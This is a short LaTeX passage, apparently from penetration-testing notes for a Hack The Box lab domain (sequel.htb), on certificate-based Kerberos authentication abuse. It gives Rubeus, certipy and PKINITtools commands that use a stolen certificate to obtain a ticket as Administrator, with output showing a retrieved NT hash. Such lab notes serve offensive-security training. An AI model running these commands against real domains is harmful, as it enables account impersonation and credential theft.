
\section{Authentication}
\subsection{PassTheCert with PKINIT}

\subsubsection{On windows}

\begin{verbatim}
Rubeus.exe asktgt /user:<accountToImpersonate> /certificate:<pfx path> /ptt
\end{verbatim}

\subsubsection{From Linux}
Using \verb+certipy+:
\begin{verbatim}
$ certipy auth -pfx administrator.pfx -username Administrator -domain sequel.htb  -dc-ip 10.10.11.202
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
\end{verbatim}


Using \href{https://github.com/dirkjanm/PKINITtools}{PKINITtools}:
\begin{verbatim}
$ gettgtpkinit \
    -cert-pfx /tmp/administrator.pfx \
    -dc-ip 10.10.11.202 \
    sequel.htb/Administrator \
    /tmp/test.cache
\end{verbatim}
